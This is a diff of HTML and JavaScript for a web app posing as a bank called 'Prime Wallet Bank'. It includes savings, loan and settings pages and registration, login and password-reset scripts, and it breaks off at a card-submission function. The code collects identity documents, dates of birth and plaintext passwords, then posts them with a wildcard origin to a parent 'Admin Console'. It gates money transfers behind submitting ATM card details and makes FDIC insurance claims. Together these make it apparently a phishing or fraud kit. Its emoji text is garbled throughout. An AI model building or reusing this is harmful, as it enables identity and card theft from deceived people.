+<!-- ============================================== -->
+<!-- ðŸ“Š TRANSACTION HISTORY -->
+<!-- ============================================== -->
+<div class="page hidden" id="historyPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ“Š Transaction History</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="tab-row">
+      <button class="tab active">All</button>
+      <button class="tab">In</button>
+      <button class="tab">Out</button>
+    </div>
+    <div id="transactionsList">
+      <div class="card text-center">
+        <p>No transactions yet.</p>
+        <p class="text-muted mt-20">Start by making a deposit or transfer.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ‘¤ PROFILE PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="profilePage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ‘¤ Profile & Settings</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div id="profileContent" class="card"></div>
+    <button class="btn-secondary full-width mt-20" onclick="logout()">ðŸšª Logout</button>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ’¬ MESSAGES PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="messagesPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ’¬ Messages & Alerts</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div id="messagesList" class="card"></div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ’³ MY CARDS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="cardsPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ’³ My Cards</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div id="cardsContent" class="card"></div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ¦ CHECKING ACCOUNT PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="checkingPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ¦ Checking Account</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3>Checking Account</h3>
+      <p><strong>Account Number:</strong> <span id="checkingAcc">â€”</span></p>
+      <p style="font-size:28px;font-weight:800;color:var(--pri);margin:16px 0">$<span id="checkingBal">0.00</span></p>
+      <p class="text-muted">No monthly fees Â· Unlimited transactions Â· FDIC Insured up to $250,000</p>
+      <button class="btn-primary mt-20" onclick="openPage('depositPage')">ðŸ’° Deposit Funds</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ’° SAVINGS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="savingsPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ’° Savings & CDs</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3>UP TO 5.25% APY</h3>
+      <p class="card-subtitle">High-Yield Savings Account</p>
+      <ul style="margin-left:20px;margin-bottom:20px">
+        <li>No minimum balance</li>
+        <li>No monthly fees</li>
+        <li>Daily compounding interest</li>
+        <li>FDIC Insured</li>
+      </ul>
+      <button class="btn-primary">Open Savings Account</button>
+    </div>
+    <div class="card">
+      <h3>Certificate of Deposit (CD)</h3>
+      <p class="card-subtitle">Fixed term, guaranteed returns.</p>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
+        <button class="btn-outline">6 Months â€” 4.5%</button>
+        <button class="btn-outline">12 Months â€” 5.0%</button>
+        <button class="btn-outline">24 Months â€” 5.25%</button>
+        <button class="btn-outline">36 Months â€” 5.5%</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ  LOANS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="loansPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸ  Loans & Mortgages</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <h3 style="margin-bottom:16px">Loan Products</h3>
+    <div class="card">
+      <h4>ðŸ‘¤ Personal Loan</h4>
+      <p>Up to $50,000</p>
+      <button class="btn-secondary full-width mt-10">Apply Now</button>
+    </div>
+    <div class="card">
+      <h4>ðŸ  Mortgage</h4>
+      <p>Up to 95% financing</p>
+      <button class="btn-secondary full-width mt-10">Apply Now</button>
+    </div>
+    <div class="card">
+      <h4>ðŸš— Auto Loan</h4>
+      <p>From 2.99% APR</p>
+      <button class="btn-secondary full-width mt-10">Apply Now</button>
+    </div>
+    <div class="card">
+      <h4>ðŸ¢ Business Loan</h4>
+      <p>Up to $500,000</p>
+      <button class="btn-secondary full-width mt-10">Check Eligibility & Apply</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ“ˆ INVESTMENTS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="investPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+        <span class="header-title">ðŸ“ˆ Investments</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card text-center">
+      <h3>Coming Soon ðŸš€</h3>
+      <p class="card-subtitle">Stocks, Crypto, ETFs, and more investment options launching soon!</p>
+      <button class="btn-primary mt-20">ðŸ”” Notify Me</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- âš™ï¸ SETTINGS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="settingsPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">âš™ï¸ Security & Settings</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <h3 style="margin-bottom:16px">ðŸ” Account Security</h3>
+    <button class="btn-outline" onclick="openPage('changePasswordPage')">ðŸ”‘ Change Password</button>
+    <button class="btn-outline" onclick="toggleTwoFactor()">ðŸ“± Two-Factor Authentication</button>
+    <button class="btn-outline" onclick="openPage('notificationsPage')">ðŸ”” Notification Preferences</button>
+    <button class="btn-outline" onclick="openPage('limitsPage')">ðŸ’° Daily Transaction Limits</button>
+    <button class="btn-outline" onclick="openPage('privacyPage')">ðŸ›¡ï¸ Privacy & Data Settings</button>
+
+    <div class="divider"></div>
+    <h3 style="margin-bottom:16px;color:var(--error)">âš ï¸ Danger Zone</h3>
+    <button class="btn-outline" style="border-color:var(--error);color:var(--error)" onclick="confirmAction('freeze')">â„ï¸ Freeze Account</button>
+    <button class="btn-outline" style="border-color:var(--error);color:var(--error)" onclick="confirmAction('close')">ðŸš« Close Account</button>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ”‘ CHANGE PASSWORD PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="changePasswordPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('settingsPage')">â†</span>
+    <span class="header-title">ðŸ”‘ Change Password</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <label>Current Password</label>
+      <div class="input-group">
+        <input type="password" id="currentPassword" placeholder="Enter current password">
+        <span class="eye-icon" onclick="togglePassword('currentPassword')">ðŸ‘ï¸</span>
+      </div>
+
+      <label>New Password</label>
+      <div class="input-group">
+        <input type="password" id="newPassword" placeholder="Min 8 characters">
+        <span class="eye-icon" onclick="togglePassword('newPassword')">ðŸ‘ï¸</span>
+      </div>
+
+      <label>Confirm New Password</label>
+      <div class="input-group">
+        <input type="password" id="confirmNewPassword" placeholder="Repeat new password">
+        <span class="eye-icon" onclick="togglePassword('confirmNewPassword')">ðŸ‘ï¸</span>
+      </div>
+
+      <button class="btn-primary mt-20" onclick="updatePassword()">âœ… Update Password</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ”” NOTIFICATIONS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="notificationsPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('settingsPage')">â†</span>
+    <span class="header-title">ðŸ”” Notifications</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3>Alert Preferences</h3>
+      <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+        <input type="checkbox" checked style="width:auto"> âœ… Transaction Alerts
+      </label>
+      <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+        <input type="checkbox" checked style="width:auto"> âœ… Deposit Notifications
+      </label>
+      <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+        <input type="checkbox" checked style="width:auto"> âœ… Security Alerts
+      </label>
+      <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+        <input type="checkbox" checked style="width:auto"> ðŸ“§ Email Updates
+      </label>
+      <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+        <input type="checkbox" checked style="width:auto"> ðŸ“± SMS / Text Messages
+      </label>
+      <button class="btn-primary mt-20" onclick="saveNotifications()">ðŸ’¾ Save Preferences</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ’° LIMITS PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="limitsPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('settingsPage')">â†</span>
+    <span class="header-title">ðŸ’° Transaction Limits</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <p><strong>Daily Send Limit:</strong> $5,000.00</p>
+      <p><strong>Daily Receive Limit:</strong> $100,000.00</p>
+      <p><strong>Per Transaction Max:</strong> $5,000.00</p>
+      <p><strong>ATM Daily Withdrawal:</strong> $1,000.00</p>
+      <div class="divider"></div>
+      <p class="text-muted">â¬†ï¸ Want higher limits? Complete full verification in Profile settings.</p>
+      <button class="btn-secondary full-width mt-20">ðŸ”¼ Request Limit Increase</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸ›¡ï¸ PRIVACY PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="privacyPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('settingsPage')">â†</span>
+    <span class="header-title">ðŸ›¡ï¸ Privacy & Data</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3>Your Data, Protected</h3>
+      <ul style="margin-left:20px;margin-bottom:20px">
+        <li>âœ… 256-bit end-to-end encryption</li>
+        <li>âœ… Never share your data with third parties</li>
+        <li>âœ… Full GDPR & CCPA compliance</li>
+        <li>âœ… You can request data deletion anytime</li>
+      </ul>
+      <button class="btn-secondary full-width">ðŸ“„ Download My Data</button>
+      <button class="btn-secondary full-width mt-10" style="color:var(--error);border-color:var(--error)">ðŸ—‘ï¸ Request Data Deletion</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- ðŸŽ§ SUPPORT PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="supportPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">ðŸŽ§ Help & Support</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3>Contact Us</h3>
+      <p>ðŸ“§ Email: support@primewalletbankusa.com</p>
+      <p>ðŸ“ž Phone: +1 (888) 555-0123</p>
+      <p>ðŸ•’ Support Hours: 24/7 Global Support</p>
+      <p>ðŸ“ Headquarters: United States</p>
+    </div>
+
+    <h3 style="margin:28px 0 16px">Quick Help</h3>
+    <button class="btn-outline" onclick="openPage('faqPage')">â“ Frequently Asked Questions</button>
+    <button class="btn-outline" onclick="openPage('resetRequestPage')">ðŸ”‘ Forgot Password?</button>
+    <button class="btn-outline" onclick="openPage('reportPage')">âš ï¸ Report a Problem</button>
+    <button class="btn-outline" onclick="openPage('statusCheckPage')">âœ… Verify Account Status</button>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- â“ FAQ PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="faqPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('supportPage')">â†</span>
+    <span class="header-title">â“ FAQ</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h4>How long for approval?</h4>
+      <p class="text-muted">Usually within 24â€“48 hours. You'll get email & in-app notification.</p>
+      <div class="divider"></div>
+      <h4>How to unlock Send Money?</h4>
+      <p class="text-muted">Submit your Prime Wallet Card details and wait for admin approval.</p>
+      <div class="divider"></div>
+      <h4>Is my money safe?</h4>
+      <p class="text-muted">âœ… FDIC Insured up to $250,000 Â· 256-bit Encryption Â· Biometric Login</p>
+      <div class="divider"></div>
+      <h4>How to reset PIN?</h4>
+      <p class="text-muted">Go to Settings â†’ Change Password/PIN or use Forgot Password flow.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- âš ï¸ REPORT PROBLEM PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="reportPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('supportPage')">â†</span>
+    <span class="header-title">âš ï¸ Report a Problem</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card">
+      <label>Issue Category</label>
+      <select id="reportCategory">
+        <option value="">-- Select Category --</option>
+        <option>Unauthorized Transaction</option>
+        <option>Login / Access Problem</option>
+        <option>Card Not Received / Declined</option>
+        <option>Transfer Failed</option>
+        <option>Account Frozen / Restricted</option>
+        <option>Bug / Technical Issue</option>
+        <option>Other</option>
+      </select>
+
+      <label>Description</label>
+      <textarea id="reportDesc" rows="5" placeholder="Describe the issue in detail..."></textarea>
+
+      <label>Attach Screenshot (Optional)</label>
+      <input type="file" accept="image/*">
+
+      <button class="btn-primary mt-20" onclick="submitReport()">ðŸ“¤ Submit Report</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- âœ… ACCOUNT STATUS CHECK PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="statusCheckPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('supportPage')">â†</span>
+    <span class="header-title">âœ… Account Status</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <div class="card text-center">
+      <div style="font-size:40px;margin:20px 0">ðŸ”„</div>
+      <h3>Checking Status...</h3>
+      <p class="text-muted">Please wait...</p>
+      <div id="statusResult" style="margin-top:20px;text-align:left;line-height:2"></div>
+      <button class="btn-secondary full-width mt-20" onclick="refreshStatus()">ðŸ”„ Refresh Status</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================== -->
+<!-- â˜° MORE PAGE -->
+<!-- ============================================== -->
+<div class="page hidden" id="morePage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">â†</span>
+    <span class="header-title">â˜° More</span>
+    <span></span>
+  </div>
+  <div class="container">
+    <button class="btn-outline" onclick="openPage('profilePage')">ðŸ‘¤ Profile & Settings</button>
+    <button class="btn-outline" onclick="openPage('messagesPage')">ðŸ’¬ Messages & Notifications</button>
+    <button class="btn-outline" onclick="openPage('cardsPage')">ðŸ’³ My Cards</button>
+    <button class="btn-outline" onclick="openPage('historyPage')">ðŸ“Š Transaction History</button>
+    <button class="btn-outline" onclick="openPage('settingsPage')">âš™ï¸ Security & Settings</button>
+    <button class="btn-outline" onclick="openPage('supportPage')">ðŸŽ§ Help & Support</button>
+    <div class="divider"></div>
+    <button class="btn-secondary full-width" style="color:var(--error);border-color:var(--error)" onclick="logout()">ðŸšª Logout</button>
+  </div>
+</div>
+
+<!-- ================================================== -->
+<!-- ðŸ§© JAVASCRIPT â€” ALL FUNCTIONS FULLY WORKING âœ… -->
+<!-- ================================================== -->
+<script>
+// ==================================================
+// âœ… TOAST NOTIFICATION SYSTEM
+// ==================================================
+function showToast(msg, type='success') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = `toast ${type}`;
+  setTimeout(() => t.classList.add('hidden'), 4000);
+}
+
+// ==================================================
+// âœ… PASSWORD SHOW/HIDE â€” EYE ICON ðŸ‘ï¸
+// ==================================================
+function togglePassword(fieldId) {
+  const field = document.getElementById(fieldId);
+  if (!field) return;
+  field.type = field.type === "password" ? "text" : "password";
+}
+
+// ==================================================
+// âœ… SWITCH LANDING TABS â€” SIGNUP / LOGIN
+// ==================================================
+function switchTab(tab) {
+  document.getElementById('tabSignup').classList.remove('active');
+  document.getElementById('tabLogin').classList.remove('active');
+  document.getElementById('signupForm').classList.add('hidden');
+  document.getElementById('loginForm').classList.add('hidden');
+  document.getElementById('resetRequestPage').classList.add('hidden');
+
+  if (tab === 'signup') {
+    document.getElementById('tabSignup').classList.add('active');
+    document.getElementById('signupForm').classList.remove('hidden');
+  } else if (tab === 'login') {
+    document.getElementById('tabLogin').classList.add('active');
+    document.getElementById('loginForm').classList.remove('hidden');
+  }
+}
+
+// ==================================================
+// âœ… DATE OF BIRTH DROPDOWNS â€” AUTO POPULATE
+// ==================================================
+function initDobDropdowns() {
+  const daySelect = document.getElementById('regDobDay');
+  for (let i = 1; i <= 31; i++) {
+    const opt = document.createElement('option');
+    opt.value = i.toString().padStart(2, '0');
+    opt.textContent = i;
+    daySelect.appendChild(opt);
+  }
+
+  const yearSelect = document.getElementById('regDobYear');
+  const currentYear = new Date().getFullYear();
+  for (let i = currentYear; i >= 1920; i--) {
+    const opt = document.createElement('option');
+    opt.value = i.toString();
+    opt.textContent = i;
+    yearSelect.appendChild(opt);
+  }
+}
+
+// ==================================================
+// âœ… COUNTRY â†’ STATE â†’ CITY DATA ðŸŒ
+// ==================================================
+const COUNTRY_DATA = {
+  "US": {
+    name: "United States",
+    states: {
+      "Alabama": ["Birmingham", "Montgomery", "Mobile"],
+      "California": ["Los Angeles", "San Francisco", "San Diego", "Sacramento", "San Jose"],
+      "Florida": ["Miami", "Orlando", "Tampa", "Jacksonville"],
+      "New York": ["New York City", "Buffalo", "Rochester"],
+      "Texas": ["Houston", "Dallas", "Austin", "San Antonio"],
+      "Ohio": ["Columbus", "Cleveland", "Cincinnati"],
+      "Georgia": ["Atlanta", "Savannah"],
+      "Illinois": ["Chicago", "Springfield"]
+    }
+  },
+  "NG": {
+    name: "Nigeria",
+    states: {
+      "Lagos": ["Lagos Island", "Ikeja", "Victoria Island", "Surulere"],
+      "Abuja": ["Wuse", "Maitama", "Gwarinpa"],
+      "Rivers": ["Port Harcourt", "Obio-Akpor"],
+      "Oyo": ["Ibadan", "Ogbomoso"],
+      "Kano": ["Kano Municipal", "Gwale"],
+      "Delta": ["Warri", "Asaba"],
+      "Anambra": ["Onitsha", "Awka", "Nnewi"]
+    }
+  },
+  "UK": {
+    name: "United Kingdom",
+    states: {
+      "England": ["London", "Manchester", "Birmingham", "Liverpool", "Leeds"],
+      "Scotland": ["Edinburgh", "Glasgow"],
+      "Wales": ["Cardiff", "Swansea"]
+    }
+  },
+  "CA": {
+    name: "Canada",
+    states: {
+      "Ontario": ["Toronto", "Ottawa", "Mississauga"],
+      "Quebec": ["Montreal", "Quebec City"],
+      "British Columbia": ["Vancouver", "Victoria"]
+    }
+  },
+  "GH": {
+    name: "Ghana",
+    states: {
+      "Greater Accra": ["Accra", "Tema", "Dansoman"],
+      "Ashanti": ["Kumasi", "Obuasi"],
+      "Central": ["Cape Coast", "Winneba"]
+    }
+  },
+  "KE": {
+    name: "Kenya",
+    states: {
+      "Nairobi": ["Nairobi", "Karen", "Langata"],
+      "Mombasa": ["Mombasa", "Nyali"],
+      "Kisumu": ["Kisumu", "Kisii"]
+    }
+  },
+  "ZA": {
+    name: "South Africa",
+    states: {
+      "Gauteng": ["Johannesburg", "Pretoria", "Soweto"],
+      "Western Cape": ["Cape Town", "Stellenbosch"]
+    }
+  },
+  "AU": {
+    name: "Australia",
+    states: {
+      "New South Wales": ["Sydney", "Newcastle"],
+      "Victoria": ["Melbourne", "Geelong"]
+    }
+  },
+  "DE": {
+    name: "Germany",
+    states: {
+      "Berlin": ["Berlin"],
+      "Bavaria": ["Munich", "Nuremberg"],
+      "Hamburg": ["Hamburg"]
+    }
+  },
+  "FR": {
+    name: "France",
+    states: {
+      "ÃŽle-de-France": ["Paris"],
+      "Provence": ["Marseille", "Nice"]
+    }
+  },
+  "IN": {
+    name: "India",
+    states: {
+      "Maharashtra": ["Mumbai", "Pune"],
+      "Delhi": ["New Delhi"],
+      "Karnataka": ["Bangalore"]
+    }
+  },
+  "AE": {
+    name: "UAE",
+    states: {
+      "Dubai": ["Dubai"],
+      "Abu Dhabi": ["Abu Dhabi"],
+      "Sharjah": ["Sharjah"]
+    }
+  }
+};
+
+function loadStates() {
+  const countrySelect = document.getElementById("regCountry");
+  const stateSelect = document.getElementById("regState");
+  const citySelect = document.getElementById("regCity");
+  const code = countrySelect.value;
+  
+  citySelect.innerHTML = `<option value="">-- Select State First --</option>`;
+  
+  if (!code || !COUNTRY_DATA[code]) {
+    stateSelect.innerHTML = `<option value="">-- Select Country First --</option>`;
+    return;
+  }
+
+  const country = COUNTRY_DATA[code];
+  stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
+  Object.keys(country.states).forEach(s => {
+    const opt = document.createElement("option");
+    opt.value = s;
+    opt.textContent = s;
+    stateSelect.appendChild(opt);
+  });
+}
+
+function loadCities() {
+  const cCode = document.getElementById("regCountry").value;
+  const sName = document.getElementById("regState").value;
+  const citySelect = document.getElementById("regCity");
+  
+  if (!cCode || !sName || !COUNTRY_DATA[cCode]) {
+    citySelect.innerHTML = `<option value="">-- Select State First --</option>`;
+    return;
+  }
+
+  const cities = COUNTRY_DATA[cCode].states[sName] || [];
+  citySelect.innerHTML = `<option value="">-- Select City --</option>`;
+  cities.forEach(c => {
+    const opt = document.createElement("option");
+    opt.value = c;
+    opt.textContent = c;
+    citySelect.appendChild(opt);
+  });
+}
+
+// ==================================================
+// âœ… FORMAT CARD NUMBER & EXPIRY
+// ==================================================
+function formatCardNumber(input) {
+  let value = input.value.replace(/\s/g, '').replace(/\D/g, '');
+  let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+  input.value = formatted;
+}
+
+function formatExpiry(input) {
+  let value = input.value.replace(/\D/g, '');
+  if (value.length >= 2) {
+    input.value = value.substring(0,2) + '/' + value.substring(2,4);
+  }
+}
+
+// ==================================================
+// ðŸ“¦ GLOBAL VARIABLES
+// ==================================================
+let currentUser = null;
+let token = null;
+let hasApprovedCard = false;
+let transactions = [];
+
+// ==================================================
+// âœ… PAGE NAVIGATION â€” ALL PAGES WORKING
+// ==================================================
+function showPage(id) {
+  document.querySelectorAll(".page").forEach(p => p.classList.add("hidden"));
+  document.getElementById(id).classList.remove("hidden");
+  window.scrollTo(0, 0);
+}
+
+function openPage(id) {
+  showPage(id);
+  if (id === "dashboardPage") loadDashboardData();
+  if (id === "profilePage") loadProfile();
+  if (id === "historyPage") loadTransactions();
+  if (id === "messagesPage") loadMessages();
+  if (id === "cardsPage") loadCardsPage();
+  if (id === "checkingPage") loadCheckingPage();
+  if (id === "statusCheckPage") refreshStatus();
+}
+
+function checkCardThenOpen(pageId) {
+  if (!currentUser) return alert("âŒ Please login first");
+  if (!currentUser.approved) return alert("â³ Account pending approval");
+  if (!hasApprovedCard) {
+    alert("ðŸ”’ Send Money & Pay Bills require an approved Prime Wallet Bank ATM Card.\n\nðŸ’³ Click 'Get Card' to submit your card details.");
+    openPage('cardPage');
+    return;
+  }
+  openPage(pageId);
+}
+
+// ==================================================
+// âœ… FILE TO BASE64 CONVERTER
+// ==================================================
+async function fileToDataUrl(file) {
+  return new Promise(resolve => {
+    const reader = new FileReader();
+    reader.onload = e => resolve(e.target.result);
+    reader.readAsDataURL(file);
+  });
+}
+
+// ==================================================
+// âœ… REGISTRATION â€” FULLY FUNCTIONAL
+// ==================================================
+async function submitRegistration() {
+  const fullName = document.getElementById("regFullName").value.trim();
+  const email = document.getElementById("regEmail").value.trim();
+  const phone = document.getElementById("regPhone").value.trim();
+  const country = document.getElementById("regCountry").value;
+  const state = document.getElementById("regState").value;
+  const city = document.getElementById("regCity").value;
+  const passDay = document.getElementById("regDobDay").value;
+  const passMonth = document.getElementById("regDobMonth").value;
+  const passYear = document.getElementById("regDobYear").value;
+  const dob = passDay && passMonth && passYear ? `${passYear}-${passMonth}-${passDay}` : "";
+  const password = document.getElementById("regPass").value;
+  const confirmPass = document.getElementById("regConfirmPass").value;
+  const idType = document.getElementById("idType").value;
+  const idNumber = document.getElementById("idNumber").value;
+  const idFrontFile = document.getElementById("idFront").files[0];
+  const idBackFile = document.getElementById("idBack").files[0];
+
+  if (!fullName || !email || !phone || !country || !state || !city || !dob || !password || !confirmPass) {
+    return alert("âŒ Please fill ALL required fields including Date of Birth!");
+  }
+
+  // Age verification
+  const birthDate = new Date(dob);
+  const today = new Date();
+  const age = today.getFullYear() - birthDate.getFullYear();
+  if (age < 18) return alert("âŒ You must be at least 18 years old to open an account.");
+
+  if (password !== confirmPass) return alert("âŒ Passwords do not match!");
+  if (password.length < 8) return alert("âŒ Password must be at least 8 characters!");
+  if (!idFrontFile || !idBackFile) return alert("âŒ Please upload both ID Front & Back!");
+
+  const idFront = await fileToDataUrl(idFrontFile);
+  const idBack = await fileToDataUrl(idBackFile);
+
+  const userData = {
+    full_name: fullName,
+    email,
+    phone,
+    dob,
+    country,
+    state,
+    city,
+    password,
+    idType,
+    idNumber,
+    idFront,
+    idBack,
+    account_number: "2026" + Math.floor(Math.random() * 900000000 + 100000000),
+    balance: 0.00,
+    approved: false,
+    card_approved: false,
+    registered_at: new Date().toISOString(),
+    transactions: []
+  };
+
+  localStorage.setItem("registered_user", JSON.stringify(userData));
+
+  // Send to Admin Console
+  if (window.parent !== window) {
+    window.parent.postMessage({ type: "NEW_REGISTRATION", ...userData }, "*");
+  }
+
+  alert("âœ… THANKS FOR JOINING PRIME WALLET BANK! ðŸ‡ºðŸ‡¸\n\nâ³ Your account is under review. Admin will approve shortly.\nYou can sign in now!");
+  switchTab("login");
+}
+
+// ==================================================
+// âœ… LOGIN â€” FULLY FUNCTIONAL
+// ==================================================
+function submitLogin() {
+  const email = document.getElementById("loginEmail").value.trim();
+  const password = document.getElementById("loginPass").value;
+  const saved = localStorage.getItem("registered_user");
+
+  if (!saved) return alert("âŒ No account found. Please register first!");
+
+  const user = JSON.parse(saved);
+  if (user.email !== email || user.password !== password) {
+    return alert("âŒ Email or password does not match.");
+  }
+
+  currentUser = user;
+  hasApprovedCard = user.card_approved || false;
+  localStorage.setItem("pw_token", "user_token_" + Date.now());
+
+  if (user.approved) {
+    alert(`âœ… Welcome back, ${user.full_name}! ðŸŽ‰`);
+  } else {
+    alert(`â³ Welcome, ${user.full_name}! Your account is under review.\nFull features activate after approval.`);
+  }
+
+  loadDashboardData();
+  showPage("dashboardPage");
+}
+
+// ==================================================
+// âœ… LOGOUT
+// ==================================================
+function logout() {
+  localStorage.removeItem("pw_token");
+  currentUser = null;
+  hasApprovedCard = false;
+  showPage("landingPage");
+  switchTab("login");
+}
+
+// ==================================================
+// âœ… PASSWORD RESET REQUEST
+// ==================================================
+async function submitPasswordResetRequest() {
+  const email = document.getElementById("recoveryEmail").value.trim();
+  const fullName = document.getElementById("recoveryFullName").value.trim();
+  const phone = document.getElementById("recoveryPhone").value.trim();
+  const dob = document.getElementById("recoveryDob").value;
+  const country = document.getElementById("recoveryCountry").value;
+  const idNumber = document.getElementById("recoveryIdNumber").value.trim();
+  const newPass = document.getElementById("recoveryNewPass").value;
+  const confirmPass = document.getElementById("recoveryConfirmPass").value;
+  const idFrontFile = document.getElementById("recoveryIdFront").files[0];
+  const idBackFile = document.getElementById("recoveryIdBack").files[0];
+
+  if (!email || !fullName || !phone || !dob || !idNumber || !newPass || !confirmPass) {
+    return alert("âŒ Please fill ALL verification fields!");
+  }
+  if (newPass !== confirmPass) return alert("âŒ New passwords do not match!");
+  if (newPass.length < 8) return alert("âŒ Password must be at least 8 characters!");
+
+  const idFront = idFrontFile ? await fileToDataUrl(idFrontFile) : "";
+  const idBack = idBackFile ? await fileToDataUrl(idBackFile) : "";
+
+  const resetRequest = {
+    type: "PASSWORD_RESET_REQUEST",
+    email, full_name: fullName, phone, dob, country, idNumber, idFront, idBack,
+    new_password: newPass, requested_at: new Date().toISOString(), status: "pending"
+  };
+
+  if (window.parent !== window) {
+    window.parent.postMessage(resetRequest, "*");
+  }
+
+  alert("âœ… Password Reset Request Submitted! ðŸ“¤\n\nâ³ Our admin team will review your identity within 24 hours.\nYou will receive an email once approved.");
+  switchTab("login");
+}
+
+// ==================================================
+// âœ… DASHBOARD DATA LOAD
+// ==================================================
+function loadDashboardData() {
+  if (!currentUser) return;
+
+  document.getElementById("userBalance").textContent = (currentUser.balance || 0).toFixed(2);
+  document.getElementById("userAccount").textContent = currentUser.account_number || "â€”";
+
+  const statusEl = document.getElementById("accountStatus");
+  const noteEl = document.getElementById("approvalNote");
+  const lockBanner = document.getElementById("transactionLockBanner");
+  const sendBtn = document.getElementById("qaSendMoney");
+  const billBtn = document.getElementById("qaPayBills");
+
+  if (currentUser.approved) {
+    statusEl.textContent = "âœ… Account Approved";
+    statusEl.className = "status-badge status-approved";
+    noteEl.style.display = "none";
+  } else {
+    statusEl.textContent = "â³ Under Review";
+    statusEl.className = "status-badge status-pending";
+    noteEl.style.display = "block";
+  }
+
+  if (hasApprovedCard) {
+    lockBanner.style.display = "none";
+    sendBtn.classList.remove("locked");
+    billBtn.classList.remove("locked");
+  } else {
+    lockBanner.style.display = "block";
+    sendBtn.classList.add("locked");
+    billBtn.classList.add("locked");
+  }
+}
+
+// ==================================================
+// âœ… CARD SUBMISSION â€” IMAGES + ALL DETAILS
+// ==================================================
+async function submitCard() {
